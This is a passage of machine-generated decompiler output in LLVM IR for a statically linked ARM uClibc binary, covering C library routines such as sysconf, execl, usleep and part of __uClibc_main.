  %v2_2a8a8 = inttoptr i32 %v1_2a8a8 to i8*
  %v3_2a8a8 = load i8, i8* %v2_2a8a8, align 1
  %v7_2a8ac = icmp eq i8 %v3_2a8a8, 117
  br i1 %v7_2a8ac, label %dec_label_pc_2a8b4, label %.backedge3

dec_label_pc_2a8b4:                               ; preds = %dec_label_pc_2a8a8
  %v1_2a8b4 = add i32 %v2_2a88c, 3
  %v2_2a8b4 = inttoptr i32 %v1_2a8b4 to i8*
  %v3_2a8b4 = load i8, i8* %v2_2a8b4, align 1
  %v4_2a8b4 = zext i8 %v3_2a8b4 to i32
  %v0_2a8b8 = load i32, i32* @r4, align 4
  %v1_2a8b8 = load i32, i32* @sl, align 4
  %v2_2a8b8 = add i32 %v1_2a8b8, %v0_2a8b8
  %v3_2a8b8 = inttoptr i32 %v2_2a8b8 to i32*
  %v4_2a8b8 = load i32, i32* %v3_2a8b8, align 4
  %v2_2a8bc = mul nuw nsw i32 %v4_2a8b4, 2
  %v2_2a8c0 = add i32 %v4_2a8b8, %v2_2a8bc
  %v3_2a8c0 = inttoptr i32 %v2_2a8c0 to i16*
  %v4_2a8c0 = load i16, i16* %v3_2a8c0, align 2
  %v1_2a8c4 = and i16 %v4_2a8c0, 8
  %v2_2a8c4 = icmp eq i16 %v1_2a8c4, 0
  br i1 %v2_2a8c4, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_2a8b4
  %v1_2a8c8 = load i32, i32* @r5, align 4
  %v2_2a8c8 = add i32 %v1_2a8c8, 1
  store i32 %v2_2a8c8, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_2a8b4, %dec_label_pc_2a888, %dec_label_pc_2a89c, %dec_label_pc_2a8a8
  %v0_2a8cc.pre = load i32, i32* @r6, align 4
  %v0_2a8d8.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_2a874
  %v0_2a8d8 = phi i32 [ %v0_2a8d8.pre, %.backedge3 ], [ %v2_2a87c, %dec_label_pc_2a874 ]
  %v0_2a8cc = phi i32 [ %v0_2a8cc.pre, %.backedge3 ], [ %v1_2a868, %dec_label_pc_2a874 ]
  %v4_2a8dc = inttoptr i32 %v0_2a8cc to i32*
  %v5_2a8dc = call i32 @__GI_config_read(i32* %v4_2a8dc, i32 %v2_2a880, i32 258, i32 %v0_2a8d8)
  %v2_2a8e0 = icmp eq i32 %v5_2a8dc, 0
  br i1 %v2_2a8e0, label %dec_label_pc_2a950, label %dec_label_pc_2a888

dec_label_pc_2a8ec:                               ; preds = %entry
  %v0_2a8f0 = load i32, i32* @r4, align 4
  %v2_2a8f0 = add i32 %v0_2a8f0, -36172
  store i32 %v2_2a8f0, i32* @r0, align 4
  %v1_2a8f4 = call i32 @__GI_config_open(i32 %v2_2a8f0)
  store i32 %v1_2a8f4, i32* @r6, align 4
  %v2_2a8f8 = icmp eq i32 %v1_2a8f4, 0
  br i1 %v2_2a8f8, label %bb19, label %dec_label_pc_2a904

bb19:                                             ; preds = %dec_label_pc_2a8ec
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_2a950

dec_label_pc_2a904:                               ; preds = %dec_label_pc_2a8ec
  %v0_2a908 = load i32, i32* @r4, align 4
  %v2_2a908 = add i32 %v0_2a908, -36156
  store i32 %v2_2a908, i32* @r8, align 4
  %v2_2a910 = add i32 %v0_2a908, -36120
  store i32 %v2_2a910, i32* @r7, align 4
  %v2_2a914 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_2a914, i32* @r4, align 4
  br label %bb21

dec_label_pc_2a91c:                               ; preds = %bb21
  %v0_2a948 = load i32, i32* @r8, align 4
  %v3_2a91c = load i32, i32* %stack_var_-36, align 4
  %v1_2a920 = inttoptr i32 %v3_2a91c to i32*
  %v2_2a920 = load i32, i32* %v1_2a920, align 4
  store i32 %v2_2a920, i32* @r1, align 4
  %v2_2a924 = inttoptr i32 %v0_2a948 to i8*
  %v3_2a924 = call i32 @__GI_strcoll(i8* %v2_2a924, i32 %v2_2a920)
  %v2_2a928 = icmp eq i32 %v3_2a924, 0
  br i1 %v2_2a928, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_2a91c
  %v1_2a92c = load i32, i32* @r5, align 4
  %v2_2a92c = add i32 %v1_2a92c, 1
  store i32 %v2_2a92c, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_2a91c
  %v0_2a938.pre = load i32, i32* @r7, align 4
  %v0_2a93c.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_2a904
  %v0_2a93c = phi i32 [ %v0_2a93c.pre, %.backedge ], [ %v1_2a8f4, %dec_label_pc_2a904 ]
  %v0_2a938 = phi i32 [ %v0_2a938.pre, %.backedge ], [ %v2_2a910, %dec_label_pc_2a904 ]
  %v4_2a940 = inttoptr i32 %v0_2a93c to i32*
  %v5_2a940 = call i32 @__GI_config_read(i32* %v4_2a940, i32 %v2_2a914, i32 459266, i32 %v0_2a938)
  %v2_2a944 = icmp eq i32 %v5_2a940, 0
  br i1 %v2_2a944, label %dec_label_pc_2a950, label %dec_label_pc_2a91c

dec_label_pc_2a950:                               ; preds = %bb18, %bb21, %bb19
  %v0_2a950 = load i32, i32* @r6, align 4
  %v1_2a954 = inttoptr i32 %v0_2a950 to i32*
  %v2_2a954 = call i32 @__GI_config_close(i32* %v1_2a954)
  %v0_2a958 = load i32, i32* @r5, align 4
  %v2_2a958 = icmp eq i32 %v0_2a958, 0
  %.v0_2a958 = select i1 %v2_2a958, i32 1, i32 %v0_2a958
  ret i32 %.v0_2a958

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 258, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2a950, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_2ad7c

bb:                                               ; preds = %entry
  %v7_2a9a8 = mul i32 %arg1, 4
  %v8_2a9a8 = add i32 %v7_2a9a8, ptrtoint (i32* @global_var_2a9b0.1850 to i32)
  call void @__pseudo_branch(i32 %v8_2a9a8)
  br label %dec_label_pc_2ad7c

dec_label_pc_2ad7c:                               ; preds = %bb, %entry
  %v0_2ad7c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_2ad88 = inttoptr i32 %v0_2ad7c to i32*
  store i32 22, i32* %v2_2ad88, align 4
  %v0_2af38 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_2af38

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_2af6c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_2af6c, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_2af80 = ptrtoint i32* %stack_var_-40 to i32
  %v2_2af84 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_2af94

dec_label_pc_2af94:                               ; preds = %dec_label_pc_2af94, %entry
  %v0_2afa8 = phi i32 [ 0, %entry ], [ %v1_2afa8, %dec_label_pc_2af94 ]
  %stack_var_-36.0 = phi i32 [ %v2_2af84, %entry ], [ %v1_2af9c, %dec_label_pc_2af94 ]
  %v1_2af98 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_2af98 = load i32, i32* %v1_2af98, align 4
  %v1_2af9c = add i32 %stack_var_-36.0, 4
  %v2_2afa0 = icmp eq i32 %v2_2af98, 0
  %v1_2afa8 = add i32 %v0_2afa8, 1
  store i32 %v1_2afa8, i32* @lr, align 4
  br i1 %v2_2afa0, label %dec_label_pc_2afb0, label %dec_label_pc_2af94

dec_label_pc_2afb0:                               ; preds = %dec_label_pc_2af94
  %v3_2afb0 = mul i32 %v1_2afa8, 4
  %v1_2afb4 = add i32 %v3_2afb0, 18
  %v1_2afb8 = and i32 %v1_2afb4, -8
  %v2_2afbc = sub i32 %v2_2af80, %v1_2afb8
  %v2_2afc4 = inttoptr i32 %v2_2afbc to i32*
  store i32 %arg2, i32* %v2_2afc4, align 4
  %v0_2afd0 = load i32, i32* @sp, align 4
  store i32 %v0_2afd0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_2afd8

dec_label_pc_2afd8:                               ; preds = %dec_label_pc_2afd8, %dec_label_pc_2afb0
  %v1_2afec = phi i32 [ %v0_2afd0, %dec_label_pc_2afb0 ], [ %v5_2afec, %dec_label_pc_2afd8 ]
  %stack_var_-36.1 = phi i32 [ %v2_2af84, %dec_label_pc_2afb0 ], [ %v1_2afe4, %dec_label_pc_2afd8 ]
  %v1_2afdc = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_2afdc = load i32, i32* %v1_2afdc, align 4
  %v0_2afe0 = load i32, i32* @lr, align 4
  %v1_2afe0 = add i32 %v0_2afe0, -1
  store i32 %v1_2afe0, i32* @lr, align 4
  %v7_2afe0 = icmp eq i32 %v0_2afe0, 1
  %v1_2afe4 = add i32 %stack_var_-36.1, 4
  %v2_2afec = add i32 %v1_2afec, 4
  %v3_2afec = inttoptr i32 %v2_2afec to i32*
  store i32 %v2_2afdc, i32* %v3_2afec, align 4
  %v4_2afec = load i32, i32* %ip.global-to-local, align 4
  %v5_2afec = add i32 %v4_2afec, 4
  store i32 %v5_2afec, i32* %ip.global-to-local, align 4
  br i1 %v7_2afe0, label %dec_label_pc_2aff4, label %dec_label_pc_2afd8

dec_label_pc_2aff4:                               ; preds = %dec_label_pc_2afd8
  %v0_2b000 = call i32 @__GI_execve()
  ret i32 %v0_2b000

; uselistorder directives
  uselistorder i32 %v5_2afec, { 1, 0 }
  uselistorder i32 %v0_2afe0, { 1, 0 }
  uselistorder i32 %v1_2afa8, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_2b018 = load i32, i32* @r4, align 4
  %v6_2b018 = load i32, i32* @r5, align 4
  store i32 1000000, i32* @r4, align 4
  %v2_2b020 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @r5, align 4
  %v2_2b02c = udiv i32 %arg1, 1000000
  store i32 %v2_2b02c, i32* %stack_var_-24, align 4
  store i32 0, i32* @r1, align 4
  %v1_2b054 = call i32 @nanosleep(i32 %v2_2b020)
  store i32 %v3_2b018, i32* @r4, align 4
  store i32 %v6_2b018, i32* @r5, align 4
  ret i32 %v1_2b054

; uselistorder directives
  uselistorder i32 (i32)* @nanosleep, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55684)
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @function_2b08c() local_unnamed_addr {
dec_label_pc_2b08c:
  ret i32 0
}

define i32 @function_2b094(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_2b094:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_2b094 = add i32 %tmp, 4
  %v4_2b094 = inttoptr i32 %v3_2b094 to i32*
  store i32 %arg3, i32* %v4_2b094, align 4
  ret i32 %tmp
}

define i32 @function_2b09c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_2b09c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_2b0a0 = icmp eq i32 %arg2, 0
  br i1 %v2_2b0a0, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_2b09c
  %v2_2b0ac = add i32 %tmp, 4
  %v3_2b0ac = inttoptr i32 %v2_2b0ac to i32*
  %v4_2b0ac = load i32, i32* %v3_2b0ac, align 4
  store i32 %v4_2b0ac, i32* %r0.global-to-local, align 4
  %v3_2b0b0 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_2b09c, %bb
  %.02 = phi i32 [ %v3_2b0b0, %bb ], [ undef, %dec_label_pc_2b09c ]
  %v2_2b0b8 = xor i1 %v2_2b0a0, true
  call void @__pseudo_cond_branch(i1 %v2_2b0b8, i32 %.02)
  %v1_2b0c4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2b0c4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_2b0ec.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_2b0c8 = load i32, i32* @r4, align 4
  store i32 %v3_2b0c8, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -152), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2b0ec

dec_label_pc_2b0ec:                               ; preds = %dec_label_pc_2b0ec.dec_label_pc_2b0ec_crit_edge, %dec_label_pc_2b0ec.lr.ph
  %v1_2b0ec = phi i32 [ %v1_2b0f8, %dec_label_pc_2b0ec.dec_label_pc_2b0ec_crit_edge ], [ 0, %dec_label_pc_2b0ec.lr.ph ]
  %v0_2b0ec = phi i32 [ %v0_2b0ec.pre, %dec_label_pc_2b0ec.dec_label_pc_2b0ec_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -152), %dec_label_pc_2b0ec.lr.ph ]
  %v4_2b0ec = mul i32 %v1_2b0ec, 4
  %v5_2b0ec = add i32 %v4_2b0ec, %v0_2b0ec
  %v6_2b0ec = inttoptr i32 %v5_2b0ec to i32*
  %v7_2b0ec = load i32, i32* %v6_2b0ec, align 4
  call void @__pseudo_branch(i32 %v7_2b0ec)
  %v0_2b0f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_2b0f8 = add i32 %v0_2b0f8, -1
  store i32 %v1_2b0f8, i32* %r4.global-to-local, align 4
  %v2_2b0f8 = icmp eq i32 %v0_2b0f8, 0
  br i1 %v2_2b0f8, label %dec_label_pc_2b100, label %dec_label_pc_2b0ec.dec_label_pc_2b0ec_crit_edge

dec_label_pc_2b0ec.dec_label_pc_2b0ec_crit_edge:  ; preds = %dec_label_pc_2b0ec
  %v0_2b0ec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2b0ec

dec_label_pc_2b100:                               ; preds = %dec_label_pc_2b0ec
  %v0_2b104.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_2b104 = add i32 %v0_2b104.pre, 55700
  %v3_2b104 = inttoptr i32 %v2_2b104 to i32*
  %v4_2b104 = load i32, i32* %v3_2b104, align 4
  %v2_2b108 = icmp eq i32 %v4_2b104, 0
  br i1 %v2_2b108, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_2b100
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_2b100, %bb
  %v2_2b110 = xor i1 %v2_2b108, true
  call void @__pseudo_cond_branch(i1 %v2_2b110, i32 %v4_2b104)
  %v0_2b118 = load i32, i32* %r5.global-to-local, align 4
  %v2_2b118 = add i32 %v0_2b118, 55704
  %v3_2b118 = inttoptr i32 %v2_2b118 to i32*
  %v4_2b118 = load i32, i32* %v3_2b118, align 4
  %v2_2b11c = icmp eq i32 %v4_2b118, 0
  br i1 %v2_2b11c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_2b124 = xor i1 %v2_2b11c, true
  call void @__pseudo_cond_branch(i1 %v2_2b124, i32 %v4_2b118)
  %v2_2b128 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2b128, i32* %r4.global-to-local, align 4
  %v1_2b12c = load i32, i32* @r0, align 4
  ret i32 %v1_2b12c

; uselistorder directives
  uselistorder i32 %v1_2b0f8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 -152, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_2b158 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_2b160 = icmp eq i32 %v2_2b158, -1
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r3, align 4
  br i1 %v3_2b160, label %dec_label_pc_2b16c, label %dec_label_pc_2b184

dec_label_pc_2b16c:                               ; preds = %entry
  %v0_2b170 = load i32, i32* %r5.global-to-local, align 4
  %v2_2b178 = call i32 @__GI_open(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36116), i32 %v0_2b170)
  %v1_2b17c = load i32, i32* %r4.global-to-local, align 4
  %v1_2b180 = icmp ne i32 %v2_2b178, %v1_2b17c
  call void @__pseudo_cond_branch(i1 %v1_2b180, i32 ptrtoint (i32* @global_var_29d60.1872 to i32))
  br label %dec_label_pc_2b184

dec_label_pc_2b184:                               ; preds = %entry, %dec_label_pc_2b16c
  %v1_2b18c = phi i32 [ %v2_2b158, %entry ], [ %v2_2b178, %dec_label_pc_2b16c ]
  ret i32 %v1_2b18c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_2b184, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r4.global-to-local, align 4
  %v4_2b1a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 220) to i32*), align 4
  %v1_2b1ac = inttoptr i32 %v4_2b1a8 to i32*
  %v2_2b1ac = load i32, i32* %v1_2b1ac, align 4
  %v2_2b1b0 = icmp eq i32 %v2_2b1ac, 0
  br i1 %v2_2b1b0, label %dec_label_pc_2b1b8, label %dec_label_pc_2b1ec

dec_label_pc_2b1b8:                               ; preds = %entry
  %v4_2b1bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 124) to i32*), align 4
  %v2_2b1c4 = icmp eq i32 %v4_2b1bc, 0
  store i32 4096, i32* %v1_2b1ac, align 4
  br i1 %v2_2b1c4, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_2b1b8
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_2b1b8, %bb
  %v2_2b1d0 = xor i1 %v2_2b1c4, true
  call void @__pseudo_cond_branch(i1 %v2_2b1d0, i32 %v4_2b1bc)
  %v0_2b1d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_2b1d8 = add i32 %v0_2b1d8, -132940
  %v2_2b1e0 = icmp eq i32 %v2_2b1d8, 0
  br i1 %v2_2b1e0, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_2b1e8 = xor i1 %v2_2b1e0, true
  call void @__pseudo_cond_branch(i1 %v2_2b1e8, i32 %v2_2b1d8)
  br label %dec_label_pc_2b1ec

dec_label_pc_2b1ec:                               ; preds = %entry, %bb6
  %v1_2b1f0 = load i32, i32* @r0, align 4
  ret i32 %v1_2b1f0

; uselistorder directives
  uselistorder i32 124, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_2b1ec, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_2b20c = add i32 %tmp, 4
  store i32 %v1_2b20c, i32* %ip.global-to-local, align 4
  %v2_2b210 = load i32, i32* %arg3, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v3_2b21c = mul i32 %arg2, 4
  store i32 %v3_2b21c, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_2b224 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 40) to i32*), align 4
  store i32 80, i32* %r2.global-to-local, align 4
  %v2_2b22c = ptrtoint i32* %stack_var_-120 to i32
  %v4_2b230 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 80) to i32*), align 4
  store i32 %v4_2b230, i32* %r4.global-to-local, align 4
  %v2_2b238 = add i32 %v1_2b20c, %v3_2b21c
  store i32 %v2_2b238, i32* %ip.global-to-local, align 4
  %v9_2b23c = icmp eq i32 %v2_2b238, %v2_2b210
  store i1 %v9_2b23c, i1* %cpsr_z.global-to-local, align 1
  %v2_2b240 = inttoptr i32 %v4_2b224 to i32*
  store i32 %arg7, i32* %v2_2b240, align 4
  store i32 55704, i32* %r2.global-to-local, align 4
  %v0_2b24c = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_2b23c, label %bb, label %.critedge

bb:                                               ; preds = %entry
  %v1_2b250 = load i32, i32* @r7, align 4
  %v2_2b250 = load i32, i32* %r5.global-to-local, align 4
  %v3_2b250 = add i32 %v2_2b250, %v1_2b250
  store i32 %v3_2b250, i32* %r3.global-to-local, align 4
  %v1_2b254 = load i32, i32* @r6, align 4
  %v3_2b254 = add i32 %v1_2b254, 55704
  %v4_2b254 = inttoptr i32 %v3_2b254 to i32*
  store i32 %arg6, i32* %v4_2b254, align 4
  %v0_2b258 = load i32, i32* %ip.global-to-local, align 4
  %v1_2b258 = load i32, i32* %r4.global-to-local, align 4
  %v2_2b258 = inttoptr i32 %v1_2b258 to i32*
  store i32 %v0_2b258, i32* %v2_2b258, align 4
  store i32 120, i32* @r2, align 4
  %v1_2b264 = load i32, i32* %r3.global-to-local, align 4
  %v2_2b264 = load i32, i32* %r4.global-to-local, align 4
  %v3_2b264 = inttoptr i32 %v2_2b264 to i32*
  store i32 %v1_2b264, i32* %v3_2b264, align 4
  br label %bb58

.critedge:                                        ; preds = %entry
  %v1_2b254.c = load i32, i32* @r6, align 4
  %v3_2b254.c = add i32 %v1_2b254.c, 55704
  %v4_2b254.c = inttoptr i32 %v3_2b254.c to i32*
  store i32 %arg6, i32* %v4_2b254.c, align 4
  %v0_2b258.c = load i32, i32* %ip.global-to-local, align 4
  %v1_2b258.c = load i32, i32* %r4.global-to-local, align 4
  %v2_2b258.c = inttoptr i32 %v1_2b258.c to i32*
  store i32 %v0_2b258.c, i32* %v2_2b258.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb58

bb58:                                             ; preds = %.critedge, %bb
  store i32 %v2_2b22c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_2b270 = call i32 @__GI_memset()
  %v0_2b274 = load i32, i32* %r4.global-to-local, align 4
  %v1_2b274 = inttoptr i32 %v0_2b274 to i32*
  %storemerge.pre = load i32, i32* %v1_2b274, align 4
  br label %dec_label_pc_2b280

dec_label_pc_2b280:                               ; preds = %dec_label_pc_2b280, %bb58
  %storemerge = phi i32 [ %storemerge.pre, %bb58 ], [ %v4_2b280, %dec_label_pc_2b280 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_2b280 = inttoptr i32 %storemerge to i32*
  %v2_2b280 = load i32, i32* %v1_2b280, align 4
  store i32 %v2_2b280, i32* %r3.global-to-local, align 4
  %v4_2b280 = add i32 %storemerge, 4
  store i32 %v4_2b280, i32* %r2.global-to-local, align 4
  %v2_2b284 = icmp eq i32 %v2_2b280, 0
  br i1 %v2_2b284, label %dec_label_pc_2b290, label %dec_label_pc_2b280

dec_label_pc_2b290:                               ; preds = %dec_label_pc_2b280
  store i32 %v4_2b280, i32* @r4, align 4
  store i32 %v2_2b22c, i32* @r5, align 4
  %v1_2b2b429 = inttoptr i32 %v4_2b280 to i32*
  %v2_2b2b430 = load i32, i32* %v1_2b2b429, align 4
  store i32 %v2_2b2b430, i32* %r3.global-to-local, align 4
  %v2_2b2b832 = icmp eq i32 %v2_2b2b430, 0
  store i1 %v2_2b2b832, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b2b832, label %dec_label_pc_2b2c0, label %dec_label_pc_2b29c

dec_label_pc_2b29c:                               ; preds = %dec_label_pc_2b290, %dec_label_pc_2b2b4
  %v5_2b2a0 = phi i32 [ %v2_2b2b4, %dec_label_pc_2b2b4 ], [ %v2_2b2b430, %dec_label_pc_2b290 ]
  %v2_2b29c = icmp ugt i32 %v5_2b2a0, 13
  %v7_2b29c = icmp eq i32 %v5_2b2a0, 14
  store i1 %v7_2b29c, i1* %cpsr_z.global-to-local, align 1
  %v2_2b2a0 = xor i1 %v2_2b29c, true
  %v3_2b2a0 = or i1 %v7_2b29c, %v2_2b2a0
  br i1 %v3_2b2a0, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_2b29c
  %v6_2b2a0 = and i32 %v5_2b2a0, 536870912
  %v7_2b2a0 = icmp ne i32 %v6_2b2a0, 0
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_2b29c, %bb59
  %v1_2b2ac = phi i1 [ %v2_2b29c, %dec_label_pc_2b29c ], [ %v7_2b2a0, %bb59 ]
  %v2_2b2a4 = xor i1 %v1_2b2ac, true
  %v3_2b2a4 = or i1 %v7_2b29c, %v2_2b2a4
  br i1 %v3_2b2a4, label %bb61, label %dec_label_pc_2b2b4

bb61:                                             ; preds = %bb60
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2b2b4

dec_label_pc_2b2b4:                               ; preds = %bb60, %bb61
  call void @__pseudo_cond_branch(i1 %v3_2b2a4, i32 ptrtoint (i32* @global_var_25f40.1708 to i32))
  %v0_2b2b0 = load i32, i32* @r4, align 4
  %v1_2b2b0 = add i32 %v0_2b2b0, 8
  store i32 %v1_2b2b0, i32* @r4, align 4
  %v1_2b2b4 = inttoptr i32 %v1_2b2b0 to i32*
  %v2_2b2b4 = load i32, i32* %v1_2b2b4, align 4
  store i32 %v2_2b2b4, i32* %r3.global-to-local, align 4
  %v2_2b2b8 = icmp eq i32 %v2_2b2b4, 0
  store i1 %v2_2b2b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b2b8, label %dec_label_pc_2b2c0, label %dec_label_pc_2b29c

dec_label_pc_2b2c0:                               ; preds = %dec_label_pc_2b2b4, %dec_label_pc_2b290
  %v1_2b2c4 = call i32 @_dl_aux_init(i32 %v2_2b22c)
  store i32 %v1_2b2c4, i32* @r0, align 4
  %v1_2b2c8 = call i32 @__GI___uClibc_init(i32 %v1_2b2c4)
  store i32 %v1_2b2c8, i32* @r0, align 4
  store i32 220, i32* %r3.global-to-local, align 4
  store i32 %tmp54, i32* @r2, align 4
  %v0_2b2d4 = load i32, i32* @r6, align 4
  %v2_2b2d4 = add i32 %v0_2b2d4, 220
  %v3_2b2d4 = inttoptr i32 %v2_2b2d4 to i32*
  %v4_2b2d4 = load i32, i32* %v3_2b2d4, align 4
  store i32 %tmp53, i32* @r3, align 4
  %v2_2b2dc = icmp eq i32 %tmp54, 0
  store i1 %v2_2b2dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b2dc, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_2b2c0
  store i32 4096, i32* @r2, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_2b2c0, %bb62
  %v0_2b2e8 = phi i32 [ %tmp54, %dec_label_pc_2b2c0 ], [ 4096, %bb62 ]
  %v3_2b2e4 = icmp eq i32 %tmp53, -1
